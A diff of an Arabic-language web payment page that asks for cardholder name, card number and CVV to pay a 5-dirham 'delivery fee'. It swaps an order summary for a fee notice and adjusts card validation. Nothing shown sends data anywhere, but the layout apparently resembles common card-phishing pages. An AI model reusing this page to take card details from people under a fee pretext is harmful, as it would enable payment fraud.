@@ -159,37 +159,52 @@
             padding-bottom: 10px;
         }
 
-        .summary-item {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 15px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #f0f0f0;
+        .fees-section {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            border: 1px solid #e0e0e0;
         }
 
-        .summary-item:last-child {
-            border-bottom: none;
-        }
-
-        .summary-label {
-            color: #666;
-            font-weight: 500;
-        }
-
-        .summary-value {
+        .fees-title {
             color: #1a1a1a;
+            font-size: 18px;
+            margin-bottom: 20px;
             font-weight: 600;
+            border-bottom: 2px solid #d4af37;
+            padding-bottom: 10px;
         }
 
-        .warning-box {
-            background-color: #f44336;
-            border: 1px solid #d32f2f;
-            border-radius: 6px;
-            padding: 15px;
-            margin-bottom: 20px;
-            color: #000;
+        .fees-content {
+            color: #333;
             font-size: 14px;
-            line-height: 1.6;
+            line-height: 1.8;
+        }
+
+        .fees-content p {
+            margin-bottom: 15px;
+        }
+
+        .fees-note {
+            background-color: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 12px;
+            margin-top: 15px;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #856404;
+        }
+
+        .card-logos-display {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .card-logos-display img {
+            max-width: 100%;
+            height: auto;
+            max-height: 80px;
         }
 
         .form-group {
@@ -236,34 +251,20 @@
             margin-top: 5px;
         }
 
-        .card-logos-container {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .card-logo {
-            width: 60px;
-            height: 40px;
+        .card-type-display {
             display: flex;
             align-items: center;
-            justify-content: center;
-            border: 2px solid #ddd;
-            border-radius: 6px;
-            background-color: white;
-            opacity: 0.5;
-            transition: all 0.3s ease;
+            gap: 10px;
+            margin-top: 8px;
         }
 
-        .card-logo.active {
-            opacity: 1;
-            border-color: #d4af37;
-            background-color: #fffacd;
-        }
-
-        .card-logo img {
-            max-width: 100%;
-            max-height: 100%;
+        .card-type-badge {
+            background-color: #f0f0f0;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #333;
         }
 
         .button {
@@ -379,62 +380,38 @@
                 </div>
             </div>
 
-            <!-- ملخص الطلب -->
-            <div class="payment-section">
-                <h2 class="section-title">ملخص الطلب</h2>
-                
-                <div class="summary-item">
-                    <span class="summary-label">نوع البطاقة:</span>
-                    <span class="summary-value" id="cardType">-</span>
+            <!-- قسم الرسوم -->
+            <div class="fees-section">
+                <h2 class="fees-title">رسوم التوصيل</h2>
+                <div class="fees-content">
+                    <p>سيتم خصم مبلغ 5 درهم إماراتي عند الموافقة على الطلب.</p>
+                    <div class="fees-note">
+                        <strong>ملحوظة:</strong> في حالة عدم الموافقة على الطلب، سيتم خصم مبلغ 5 درهم إماراتي من مبلغ الطلب.
+                    </div>
                 </div>
-                <div class="summary-item">
-                    <span class="summary-label">الاسم الكامل:</span>
-                    <span class="summary-value" id="fullName">-</span>
-                </div>
-                <div class="summary-item">
-                    <span class="summary-label">رقم الهوية:</span>
-                    <span class="summary-value" id="idNumber">-</span>
-                </div>
-                <div class="summary-item">
-                    <span class="summary-label">رقم الهاتف:</span>
-                    <span class="summary-value" id="phoneNumber">-</span>
-                </div>
-                <div class="summary-item">
-                    <span class="summary-label">البريد الإلكتروني:</span>
-                    <span class="summary-value" id="email">-</span>
-                </div>
-                <div class="summary-item">
-                    <span class="summary-label">عنوان التوصيل:</span>
-                    <span class="summary-value" id="deliveryAddress">-</span>
-                </div>
+            </div>
 
-                <div class="warning-box">
-                    عند الموافقة على الطلب، سيتم تحصيل منك مبلغ 5 درهم إماراتي رسوم التوصيل. في حالة عدم الموافقة على الطلب لن يتم خصم منك أي رسوم.
-                </div>
+            <!-- عرض الشعارات -->
+            <div class="card-logos-display">
+                <img src="/card_logos.jpg" alt="Card Types">
             </div>
 
             <!-- بيانات البطاقة -->
             <div class="payment-section">
                 <h2 class="section-title">بيانات البطاقة</h2>
 
-                <div class="card-logos-container">
-                    <div class="card-logo" id="visaLogo">
-                        <span style="font-size: 24px;">💳 Visa</span>
-                    </div>
-                    <div class="card-logo" id="masterLogo">
-                        <span style="font-size: 24px;">💳 Master</span>
-                    </div>
-                </div>
-
                 <div class="form-group">
                     <label for="cardholderName">اسم صاحب البطاقة</label>
-                    <input type="text" id="cardholderName" placeholder="أدخل اسم صاحب البطاقة">
+                    <input type="text" id="cardholderName" placeholder="أدخل اسم صاحب البطاقة" onkeypress="return /[a-zA-Zآ-ي\s]/.test(event.key)">
                     <div class="error-message" id="cardholderNameError"></div>
                 </div>
 
                 <div class="form-group">
                     <label for="cardNumber">رقم البطاقة</label>
-                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
+                    <div class="card-type-display">
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric">
+                        <span class="card-type-badge" id="cardTypeBadge" style="display: none;"></span>
+                    </div>
                     <div class="error-message" id="cardNumberError"></div>
                 </div>
 
@@ -446,7 +423,7 @@
 
                 <div class="form-group">
                     <label for="cvv">رمز الأمان (CVV)</label>
-                    <input type="text" id="cvv" placeholder="123" maxlength="4">
+                    <input type="text" id="cvv" placeholder="123" maxlength="4" inputmode="numeric">
                     <div class="error-message" id="cvvError"></div>
                 </div>
 
@@ -468,17 +445,6 @@
     </div>
 
     <script>
-        // تحميل البيانات من localStorage
-        function loadData() {
-            const data = JSON.parse(localStorage.getItem('formData')) || {};
-            document.getElementById('cardType').textContent = data.cardType || '-';
-            document.getElementById('fullName').textContent = data.fullName || '-';
-            document.getElementById('idNumber').textContent = data.idNumber || '-';
-            document.getElementById('phoneNumber').textContent = data.phoneNumber || '-';
-            document.getElementById('email').textContent = data.email || '-';
-            document.getElementById('deliveryAddress').textContent = data.deliveryAddress || '-';
-        }
-
         // التحقق من رقم البطاقة (Luhn Algorithm)
         function luhnCheck(num) {
             let sum = 0;
@@ -509,22 +475,17 @@
             return null;
         }
 
-        // تحديث شعارات البطاقات
-        function updateCardLogos() {
+        // تحديث شعار البطاقة
+        function updateCardTypeBadge() {
             const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
             const cardType = getCardType(cardNumber);
-            const visaLogo = document.getElementById('visaLogo');
-            const masterLogo = document.getElementById('masterLogo');
+            const badge = document.getElementById('cardTypeBadge');
             
-            // إزالة الفئة النشطة من الجميع
-            visaLogo.classList.remove('active');
-            masterLogo.classList.remove('active');
-            
-            // إضافة الفئة النشطة للبطاقة المكتشفة
-            if (cardType === 'Visa') {
-                visaLogo.classList.add('active');
-            } else if (cardType === 'MasterCard') {
-                masterLogo.classList.add('active');
+            if (cardType) {
+                badge.textContent = cardType;
+                badge.style.display = 'inline-block';
+            } else {
+                badge.style.display = 'none';
             }
         }
 
@@ -540,15 +501,15 @@
                 return true;
             }
             
-            if (!/^\d+$/.test(number) || number.length < 13 || number.length > 19) {
+            if (!/^\d+$/.test(number) || number.length !== 16) {
                 cardNumber.classList.add('error');
-                cardNumberError.textContent = 'رقم البطاقة غير صحيح';
+                cardNumberError.textContent = 'بطاقة غير صالحة، لا تستخدم';
                 return false;
             }
             
             if (!luhnCheck(number)) {
                 cardNumber.classList.add('error');
-                cardNumberError.textContent = 'بطاقة غير صالحة';
+                cardNumberError.textContent = 'بطاقة غير صالحة، لا تستخدم';
                 return false;
             }
             
@@ -627,7 +588,7 @@
 
         // إضافة مستمعي الأحداث
         document.getElementById('cardNumber').addEventListener('input', () => {
-            updateCardLogos();
+            updateCardTypeBadge();
             validateCardNumber();
         });
 
@@ -652,9 +613,6 @@
         function switchLanguage() {
             window.location.href = 'payment.html';
         }
-
-        // تحميل البيانات عند فتح الصفحة
-        window.addEventListener('DOMContentLoaded', loadData);
     </script>
 </body>
 </html>
